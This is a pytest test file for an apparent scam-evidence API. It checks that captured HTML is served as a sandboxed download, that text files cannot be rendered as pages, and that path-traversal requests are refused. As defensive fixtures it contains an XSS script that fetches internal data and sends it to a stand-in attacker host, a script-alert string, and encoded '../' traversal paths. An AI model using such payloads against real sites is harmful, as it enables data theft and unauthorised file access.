"""Serving captured evidence: only listed files, and hostile captured HTML never runs in the dashboard's origin."""

from __future__ import annotations

import json

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from scamshield.evidence.api import router
from scamshield.evidence.worker import EvidenceWorker

CASE = "SS-20261125-ABCDEF12"
HOSTILE = b"<html><script>fetch('/v1/hosts').then(r=>r.text()).then(t=>fetch('https://evil.example/?'+t))</script></html>"


@pytest.fixture
def client(tmp_path):
    folder = tmp_path / CASE
    folder.mkdir()
    files = {"capture.html": HOSTILE, "rendered_dom.html": HOSTILE, "report.pdf": b"%PDF-1.7", "headers.json": b"{}",
             "takedown_request.txt": b"<script>alert(1)</script>"}
    for name, data in files.items():
        (folder / name).write_bytes(data)
    (folder / "manifest.json").write_text(json.dumps({"files": [{"name": n} for n in files]}))
    (tmp_path / "secret.txt").write_text("outside the case")
    worker = EvidenceWorker(store=None, root=tmp_path)
    worker.cases[CASE] = {"case_ref": CASE, "verdict_ids": []}
    app = FastAPI()
    app.include_router(router)
    app.state.evidence = worker
    return TestClient(app)


@pytest.mark.parametrize("name", ["capture.html", "rendered_dom.html"])
def test_captured_html_is_a_sandboxed_download(client, name):
    r = client.get(f"/v1/evidence/{CASE}/files/{name}")
    assert r.status_code == 200 and r.content == HOSTILE
    assert r.headers["content-disposition"].startswith("attachment")
    assert r.headers["content-security-policy"].startswith("sandbox")


def test_text_files_cannot_be_sniffed_into_pages(client):
    r = client.get(f"/v1/evidence/{CASE}/files/takedown_request.txt")
    assert r.headers["content-type"].startswith("text/plain")
    assert r.headers["content-security-policy"].startswith("sandbox")


def test_pdf_stays_viewable_inline(client):
    r = client.get(f"/v1/evidence/{CASE}/files/report.pdf")
    assert r.headers["content-disposition"].startswith("inline") and "content-security-policy" not in r.headers


@pytest.mark.parametrize("path", [
    f"/v1/evidence/{CASE}/files/..%2Fsecret.txt", f"/v1/evidence/{CASE}/files/%2e%2e%2fsecret.txt",
    f"/v1/evidence/{CASE}/files/secret.txt", "/v1/evidence/..%2F/files/secret.txt",
    f"/v1/evidence/{CASE}/files/..", "/v1/evidence/SS-OTHER/files/manifest.json",
])
def test_traversal_and_unlisted_files_are_refused(client, path):
    r = client.get(path)
    assert r.status_code == 404 and b"outside the case" not in r.content
